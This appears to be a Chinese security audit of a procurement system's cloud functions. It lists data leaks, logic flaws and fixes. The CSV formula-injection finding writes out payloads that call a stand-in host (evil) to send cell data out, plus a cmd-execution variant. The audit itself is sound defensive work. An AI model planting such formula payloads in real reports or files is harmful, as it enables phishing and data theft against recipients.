# A4 安全审计：采购单写入域 + 供应商确认

- 审计时间：2026-10-18
- 审计范围：`createPurchaseOrder`、`confirmSupplierOrder`、`getSupplierOrders`、`getPurchaseOrders`、`getPurchaseOrderDetail`、`getProducts`、`getProductPrices`、`seed-data/purchase_order*.json`、`utils/cloud.js`、`utils/meta.js`
- 交叉核对（非本报告审计对象）：`dataService.auditOrder / notifySuppliersNewOrder / toggleSupplier`、`createReceipt` 价格快照段
- 前提：每个云函数均为公开可被任意客户端调用的入口；服务端不得信任客户端传入的 userId / role / storeId / supplierId / 金额 / 数量 / 状态

---

## P1

### P1-1 供应商门户返回全单内部字段 + 其他供应商确认状态
**文件**：`cloudfunctions/getSupplierOrders/index.js:143-146`

**证据**：
```js
const data = pageOrders.map(order => ({
  ...order,
  items: itemsByOrder[order.purchase_order_id] || []
}))
```
`order` 是 `purchase_order` 文档的原样展开，未做任何字段白名单过滤。供应商登录后可读到：`remark` / `audit_remark`（内部审核意见）、`audited_by` / `audited_at`、`created_by` / `created_by_name`（内部员工）、`verify_status` / `verify_amount` / `verify_voucher_file_ids` / `verify_note` / `verify_reject_note`（内部付款核销与凭证文件句柄）、`missing_reports` / `backfilled` / `request_id`，以及 **`supplier_confirmations`（按 supplier_id 键控的全量对象，含其他供应商的 `status` / `updated_at` / `updated_by`）**。

**攻击步骤**：
1. 用任意 `supplier` 账号（如 SUP001）登录，调用 `getSupplierOrders`；
2. 响应中每个订单对象直接携带 `supplier_confirmations`：SUP001 可读到 SUP002 / SUP003 对同一张单的确认/发货状态，以及 SUP002 员工账号的 `user_id`（`updated_by`）——跨供应商商业情报与账号枚举；
3. 读到 `verify_voucher_file_ids`（云存储 fileID）后，可尝试配合 `getReportFileUrl`（A6 域）下载酒店内部付款凭证；
4. 读到 `audit_remark` / `remark`，掌握内部审核口径与内部备注。

**修复建议**：在返回前显式白名单投影（`order_no` / `order_date` / `delivery_date` / `store_name` / `order_status` / `my_confirm_status` + 仅自己的 `supplier_confirmations[supplierId]`），禁止透传 `supplier_confirmations`、`verify_*`、`audit_*`、`audited_*`、`created_by*`、`remark`。

---

## P2

### P2-1 手动商品标记由客户端决定，真实商品可整单走"手动"通道绕开供应商报表与通知
**文件**：`cloudfunctions/createPurchaseOrder/index.js:283-297`、`319-321`、`447-453`

**证据**：
```js
if (item.isManual) {
  if (!productName || !unit) return { code: -1, msg: '手动商品名称和单位不能为空' }
  normalizedItems.push({ ...item, productId, productName, unit, orderQty: qty, supplierId: '', isManual: true })
  continue
}
```
`isManual` 完全由客户端传入，服务端未校验 `isManual === true` 时 `productId` 是否真实不存在（未与 `product` 集合比对），且强制 `supplierId: ''`。

**攻击步骤**：
1. 厨师/店长账号调用 `createPurchaseOrder`，items 全部传 `{ isManual: true, productId: 'P001', productName: '大白菜', unit: '棵', orderQty: 20 }`（P001 是真实档案商品，默认供应商 SUP001）；
2. 由于整单 `manualCount === items.length`，第 319 行"手动与档案商品不可混单"的拦截不触发；
3. 第 447-453 行按 `isManual` 过滤，SUP001 不会进入 `supplierMap` → **不生成供应商订货汇总报表**；审核通过后 `dataService.notifySuppliersNewOrder`（dataService:305-312）同样按 `is_manual` 跳过 → **SUP001 收不到任何通知**；
4. `is_manual: true` 使该单进入 `verify_status: 'none'` 凭证核销链路；收货阶段 `createReceipt:362-363` 对 `isManual` 行**不查 `supplier_product_price` 台账价**，实付价由人工录入；
5. 结果：一笔真实档案商品采购被伪装成"线下手动采购"，脱离协议价台账、脱离供应商台账与审计留痕，只需提交自开发票即可核销。

**破坏**：绕开供应商定价与知情权、绕开台账价对账；配合内部人共谋可掩盖非协议渠道采购。

**修复建议**：当 `isManual === true` 时，若 `productId` 命中 `product` 集合则拒绝（或要求管理员级权限并留审计标记）；对 `isManual` 商品强制 `productId` 使用带 `MANUAL_` 前缀的命名空间。

---

### P2-2 停用供应商仍可被下单并生成对外订货汇总报表
**文件**：`cloudfunctions/createPurchaseOrder/index.js:306`、`460-466`

**证据**：
```js
supplierId: product.default_supplier_id || '',   // 306：未校验供应商状态
...
const supRes = await db.collection('supplier').where({ supplier_id: _.in(idChunk) }).limit(100).get()  // 460：无 status:1 过滤
```
对比 `createPurchaseOrder:220` / `254` 对 `store` 都有 `status: 1` 校验，对 `supplier` 完全没有；而 `dataService.toggleSupplier:189-190` 明确支持把供应商置为 `status: 0`。

**攻击步骤**：
1. 管理员为终止合作将 SUP9 置为停用（`toggleSupplier`）；
2. 商品档案 `product.default_supplier_id` 仍指向 SUP9（停用供应商不会级联清理）；
3. 厨师正常下包含该商品的订单 → 订单明细 `supplier_id: 'SUP9'` 正常落库，且第 460 行仍取回其名称并生成 `supplier_order_report` 上传云存储；
4. 供应商账号若未同步停用（`app_user.status` 与 `supplier.status` 是两套状态），SUP9 仍可登录 `getSupplierOrders` 看到新订单并确认发货。

**破坏**：已终止合作渠道复活，绕过采购渠道管控；报表口径失真。

**修复建议**：在明细归一化时对 `product.default_supplier_id` 查 `supplier.status === 1`，不通过则拒绝建单（返回明确错误）；供应商停用时同步停用其关联 `app_user`。

---

### P2-3 confirmSupplierOrder 重复调用产生无限重复"已发货"站内消息（无幂等）
**文件**：`cloudfunctions/confirmSupplierOrder/index.js:78-117`

**证据**：
```js
const condRes = await db.collection('purchase_order')
  .where({ purchase_order_id: orderId, order_status: _.in(allowedStatus) })
  .update({ data: updateData })
if (!condRes.stats || condRes.stats.updated === 0) { ... }
// 发货时向订单所属门店写站内消息
if (action === 'ship') { ... await db.collection('message').add({ data: { message_id: 'MSG' + Date.now() + ... } }) }
```
条件更新只校验**主单状态**，而 `supplier_confirmations[supplierId].status` 不在 `where` 条件里；`message_id` 为 `Date.now() + random`，无去重键。

**攻击步骤**：
1. 供应商账号调用 `confirmSupplierOrder({ orderId, action: 'ship' })` 一次，正常写 1 条消息；
2. 主单状态仍在 `SHIPPABLE_ORDER_STATUS` 内（`approved` / `report_generated` / `to_receive` / `partial_received` 均长期停留），于是循环 1000 次调用同一参数；
3. 每次条件更新都成功（`supplier_confirmations` 只是被同值覆盖），每次都新增一条 `recipient_user_id: ''` 的门店广播消息；
4. 结果：门店消息中心被 1000 条"××已对采购单 X 标记发货"刷屏，同时消耗云函数调用配额（每次调用 3 次读 + 1 次写 + 1 次写消息）。

**破坏**：外部低信任角色（供应商）可对内部门店造成通知洪水与资源消耗；门店无法区分真实发货次数。

**修复建议**：在条件更新 `where` 中加入 `supplier_confirmations.${supplierId}.status !== status`（`_.neq`），状态未变化时直接返回幂等成功且**不**写消息；消息 `message_id` 使用 `MSG_SHIP_${orderId}_${supplierId}` 形式做业务幂等。

---

### P2-4 CSV 公式注入防御可被前导空白/制表符绕过，写入对外供应商报表
**文件**：`cloudfunctions/createPurchaseOrder/index.js:42-47`（用法：`428-430`、`476-478`；同款函数亦用于 `dataService:484`）

**证据**：
```js
function csvField(val) {
  let s = String(val == null ? '' : val)
  if (/^[=+\-@]/.test(s)) s = "'" + s
  return '"' + s.replace(/"/g, '""') + '"'
}
```
仅检查**首字符**。第 430 行 `csvField(item.remark || '')` 与第 478 行同样使用 `item.remark`，而 `item.remark` 来自客户端（`...item` 原样透传，见 300-309）。

**攻击步骤**：
1. 厨师在明细备注填 ` =HYPERLINK("http://evil/x.aspx?id="&A1,"点击对账")`（首字符为空格）或 `\t=cmd|...`；
2. 正则不命中 → 不加分号前缀，原样写入 `reports/supplier/.../supplier-order-*.csv` 并上传云存储推送给供应商；
3. 供应商（或管理员）用 Excel / WPS 打开报表，单元格被当作公式执行 → 钓鱼链接 / 命令执行 / 外链回传。受害方是**外部供应商**，因此也常被用作对外钓鱼载体。

**破坏**：对内为存储型公式注入；对外为针对供应商的钓鱼投放面（供应商是本系统最低信任的外部角色）。

**修复建议**：改为对 `s.replace(/^[\s'`=+-@]/, "")` 或直接 `if (/^[\s]*[=+\-@]/.test(s))` 判空后前缀；更稳妥的做法是在入库前对 `remark` 做统一清洗（`csvField` 只做兜底）。

---

## P3

### P3-1 供应商可将"已发货"降级回"已确认"，确认状态无单调约束
**文件**：`cloudfunctions/confirmSupplierOrder/index.js:12-14`、`72-80`

**证据**：
```js
const CONFIRMABLE_ORDER_STATUS = ['approved', 'report_generated', 'to_receive']
const SHIPPABLE_ORDER_STATUS = ['approved', 'report_generated', 'to_receive', 'partial_received']
const ACTION_STATUS = { confirm: 'confirmed', ship: 'shipped' }
...
updateData[`supplier_confirmations.${supplierId}`] = { status, updated_at: db.serverDate(), updated_by: ... }
```
`action: 'confirm'` 无条件把状态覆写为 `confirmed`，即使当前已是 `shipped`；`ship` 也无法把 `shipped` 推进到更终态（无单调校验，也无时间戳比较）。

**攻击/影响**：供应商在已发货（门店据此安排收货）后反复切换 `shipped → confirmed → shipped`，配合 P2-3 制造消息噪音；下游若以"已发货"作为收货提醒触发条件，可被反复拨动。属状态机缺单调性，非越权。

**修复建议**：定义 `pending < confirmed < shipped` 的等级表，仅在 `newLevel > currentLevel` 时允许写入。

---

### P3-2 采购日期 / 期望到货无上下界，可写入任意历史或未来日期
**文件**：`cloudfunctions/createPurchaseOrder/index.js:163-182`

**证据**：
```js
const today = new Date(Date.now() + 8 * 3600 * 1000).toISOString().slice(0, 10)
const actualDate = orderDate || today
const isBackfilled = actualDate < today      // 只标记，不拦截
...
if (!isDate(actualDate) || !isDateOrDateTime(actualDeliveryDate) || actualDeliveryDate < actualDate) { return -1 }
```
只校验格式与 `delivery >= orderDate`，无最早/最晚限制。

**影响**：可写 `0001-01-01` 或 `9999-12-31`。补录历史是拍板允许（清单 #16），但**未来日期**会把单挂到未来门店日汇总/月汇总口径里，污染对账；极端值还会创建 `report_version_counter` 计数器文档（`getNextVersion`，109-136）造成集合膨胀。

**修复建议**：给 `actualDate` 加合理窗口（如不早于 1 年前、不晚于 `today + 30 天`），未来到货日期同理设上限。

---

### P3-3 客户端传入 `createdByName` 直接写入对外报表"经办人"列，可伪造经办人身份
**文件**：`cloudfunctions/createPurchaseOrder/index.js:154-155`、`427`

**证据**：
```js
const { ..., createdByName, ... } = event
...
const csv1Info = ... + csvField('经办人') + ',' + csvField(createdByName || '') + '\n'   // 427
```
落库用的是服务端身份（347-352 行 `orderData.created_by_name = user.name`），但**报表 CSV 用的是客户端 `event.createdByName`**，两者互不校验。

**影响**：厨师下单时可填 `createdByName: '店长'` / 任意他人姓名，对外发往门店存档与供应商的 `store_order_report.csv` 上经办人身份被伪造（配合 P2-4 还能升级为公式注入载体）。落库追溯链未受影响，但对外文档可信度受损。

**修复建议**：报表一律取 `orderData.created_by_name`，删除对 `event.createdByName` 的依赖。

---

### P3-4 店长可见供应商级报表的 `file_url`，越出"仅门店维度报表"的信息边界
**文件**：`cloudfunctions/getPurchaseOrderDetail/index.js:127-133`、配合 `utils/cloud.js:244-253`

**证据**：
```js
const reports = user.role === 'chef'
  ? reportRes.data.filter(r => r.report_scope === 'store')
  : reportRes.data          // store_manager 拿到 supplier 级报表记录，含 file_url
...
// utils/cloud.js
async function getFileUrl(fileID) {          // 244：客户端可传任意 fileID 换临时链接
```
注释写明 chef 不下发供应商级报表元数据（信息边界），但 `store_manager` 分支拿到全量，包含 `report_scope: 'supplier'` 的 `file_url`（供应商订货报表/账单 CSV 文件句柄）。

**影响**：店长可获取发往其他供应商的订货报表文件句柄；能否真正下载取决于 `getReportFileUrl` 的授权（A6 域）[待确认]。

**修复建议**：`store_manager` 同样过滤 `report_scope !== 'supplier'`，或仅保留 `file_url` 之外的元数据。

---

### P3-5 getSupplierOrders 无上限全量拉取该供应商历史明细
**文件**：`cloudfunctions/getSupplierOrders/index.js:74-86`

**证据**：
```js
for (;;) {
  const batch = await db.collection('purchase_order_item')
    .where(itemQuery).orderBy('_id', 'asc')
    .skip(myItems.length).limit(ITEM_BATCH).get()
  myItems.push(...batch.data)
  if (batch.data.length < ITEM_BATCH) break
}
```
无 `order_date` 上界、无总量上限（`while(true)` 直到取完）。注释说明是为修"超 1000 行旧单静默消失"，但代价是把该供应商**全部历史**明细常驻内存。

**影响**：供应商账号累计行数十万时，单次调用多次 1000 行读取 + 内存持有 + 全部订单主表查询，触发云函数超时/配额耗尽；这是供应商（外部角色）可自助触发的成本放大面。

**修复建议**：改为按 `purchase_order.order_date` 区间先分页取订单、再按订单号取明细；或按 `created_at` 限制查询窗口。

---

### P3-6 幂等键对"店长代改他人草稿"场景失效
**文件**：`cloudfunctions/createPurchaseOrder/index.js:190-192`、`347-352`

**证据**：
```js
const dupRes = await db.collection('purchase_order')
  .where({ request_id: trimmedRequestId, created_by: user.user_id || user._id })
...
orderData.created_by = existingOrder
  ? (existingOrder.created_by || user.user_id || user._id)
  : (user.user_id || user._id)
```
幂等键以 `created_by` 为键，但店长代改/代提交本店他人草稿时（238-244 行允许），`created_by` 保留**原创建人**，与当前调用者的 `user_id` 不同 → 幂等复查永远查不到该单。

**影响**：店长代提交他人草稿时，前端超时重试会产生重复提交（草稿被重复改写；已提交单被重复"提交"，进而重复生成报表版本与站内消息）。非越权，属幂等覆盖缺口。

**修复建议**：幂等键改为 `(request_id, created_by)` + `(request_id, 当前操作者)` 双查，或落库时同时记录 `submitted_by` / `last_operator` 参与幂等。

---

### P3-7 `supplier_confirmations.${supplierId}` 未校验 supplierId 形态（点号 / `$` 前缀注入面）
**文件**：`cloudfunctions/confirmSupplierOrder/index.js:72-77`

**证据**：
```js
updateData[`supplier_confirmations.${supplierId}`] = {
  status, updated_at: db.serverDate(), updated_by: user.user_id || user._id
}
```
`supplierId` 取自 `user.default_supplier_id`（55 行），非本次请求参数，因此**当前不可被客户端直接控制**；但若其值形如 `SUP1.SUB2` 或 `$unset`，将分别造成嵌套路径写入与操作符语义歧义。`supplierId` 的写入入口在 `authService`（A1 域）[待确认]。

**修复建议**：入口校验 `^[A-Za-z0-9_-]{1,32}$`，或在写入前转义 `.`。

---

## 已通读但无发现（重点类别逐项核对）

| 关注类别 | 结论与证据 |
|---|---|
| **单价篡改** | **不可行**。`purchase_order_item` 落库字段（`createPurchaseOrder:395-408`）中**完全没有价格字段**；客户端传 `price` / `unitPrice` 只经 `...item` 留在内存，不落库。价格快照在收货时由服务端从 `supplier_product_price` 取（`createReceipt:363-370`）。真正的单价信任面在收货域（A5）。 |
| **跨供应商下单（供应商指定）** | 不可行。明细 `supplierId` 一律被服务端覆盖为 `product.default_supplier_id`（306）；`confirmSupplierOrder:65-69` 要求该单必须含本供应商自己的明细行。 |
| **跨门店下单** | 非全局角色被强制改写为 `user.default_store_id`（217-223）；编辑路径 241-247 阻断跨门店/他人草稿（店长例外为拍板行为）。 |
| **金额/totalAmount** | 不可行。订单主表与明细均无金额字段，不存在客户端 `totalAmount` 被信任的问题。 |
| **空/畸形明细** | 已拦截：`items` 必须为非空数组（259）、`length ≤ 100`（266）、`qty` 需 `Number.isFinite && > 0 && ≤ 1e6`（288）、`productId` 去重（291）、非手动商品必须命中 `product.status=1`（299）、手动商品名称/单位必填（294）、手动与档案不可混单（319-321）、手动商品 ≤ 5（315）。 |
| **状态机绕过（供应商侧）** | 已拦截。`CONFIRMABLE_ORDER_STATUS` / `SHIPPABLE_ORDER_STATUS` 白名单（12-13）+ 条件更新原子化（78-83），`draft` / `submitted` / `pending_approval` / `rejected` / `cancelled` / `received` / `completed` 均不可确认或发货。 |
| **自审批链路** | 已拦截。`dataService.auditOrder:514` 显式禁止下单人自审（`created_by` 与 `auditorId` 双值比对）。 |
| **IDOR 读（采购单列表/详情）** | 未发现越权。`getPurchaseOrders:50-66` 按角色强制 `store_id` / `created_by`；`getPurchaseOrderDetail:58-67` 对 chef 做门店 + 创建人双重校验，store_manager 限本店，`supplier` 角色被排除（41-67）。 |
| **写操作无事务** | 已用 `db.runTransaction` 包主单 + 明细（358-411），编辑路径在事务内先删旧明细再插新明细。 |
| **报表版本号并发** | 已用 CAS 条件更新取号（109-136），非"查最大+1"。 |
| **`orderId` 注入任意单号** | 已拦截。传入 `orderId` 时必须在库中存在（230），否则返回"订单不存在"，客户端无法指定自造单号。 |
| **`utils/meta.js`** | 纯展示映射（statusMap / reportTypeMap 等），无业务逻辑，无发现。 |
| **`seed-data/purchase_order*.json`** | 静态样例数据（3 单 9 行），无 `supplier_confirmations`、无价格字段，与结论一致。 |

---

## 未覆盖 / 存疑（需其他子域或补充信息确认）

1. **单价信任面在收货域（A5）**：`createReceipt:363-370` 按 `effective_date <= receiptDate` 取 `supplier_product_price` 最新一档，配合 `is_manual` 行跳过取价（362-363）。客户端能否在收货时篡改单价/数量、`missing_price` 流程是否可被利用，需 A5 确认；本报告 P2-1 与之叠加后危害升级。
2. **审批与作废链路（dataService.auditOrder / cancelOrder / requestCancel / verifyManualOrder / settleReceipt / repriceReceipt）**：仅为交叉核对而阅读，未纳入审计；其中"手动单凭证核销裁决"与 P2-1 是否构成自核销闭环（店长提交凭证 + 管理员核销）需确认。
3. **`getReportFileUrl` 授权（A6 域）**：P1-1 泄漏 `verify_voucher_file_ids`、P3-4 泄漏供应商级 `file_url` 后能否真正下载，取决于该函数是否校验文件归属与角色。
4. **`app_user.default_supplier_id` 的写入入口（A1 域 authService）**：决定 P3-7 是否可被利用，以及供应商账号与 `supplier.status` 是否联动停用（P2-2 的第 4 步）。
5. **CloudBase 环境安全规则**：`utils/cloud.js:244 getFileUrl(fileID)` 由客户端传任意 fileID 换取临时链接（`wx.cloud.getTempFileURL`）。是否受环境"按登录用户鉴权"保护，取决于云环境权限配置，代码层无约束，需环境配置确认。
6. **`report_file` 集合本身是否有越权读**（`getReports` / `getReportDetail`，A6 域）：供应商或厨师能否直接枚举 `source_order_id` 读取其他门店报表。
